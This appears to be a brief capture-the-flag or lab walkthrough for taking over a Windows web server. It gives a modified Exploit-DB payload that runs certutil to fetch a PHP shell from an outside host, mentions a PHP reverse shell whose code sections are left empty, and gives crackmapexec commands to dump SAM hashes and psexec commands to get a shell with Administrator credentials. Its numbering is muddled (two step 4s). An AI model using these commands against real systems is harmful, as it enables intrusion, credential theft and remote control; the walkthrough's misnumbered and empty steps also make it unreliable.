STEPS:
1. You can use the https://www.exploit-db.com/exploits/44374, but you need to modify it little bit. Since, system command is restricted you can use exec or shell_exec command with echo before that. To upload the shell use echo shell_exec("cmd.exe /C certutil -urlcache -split -f http://10.13.19.104/shell.php shell.php") command in the exploit 44374
2. After that you can use the certutil command to upload a php reverse php shell. Php reverse shell for windows:

4. Windows PHP Reverse shell binary implementation:

4. crackmapexec smb '10.10.153.99' -u 'Administrator' -p 'Password123' --local-auth --sam
To get the NTLM hash. 

5. psexec can  be used to get the shell as well:
python3 psexec.py ./administrator:'Password123'@'10.10.167.90'

The exploit works without any change and let you have the Reverse shell.
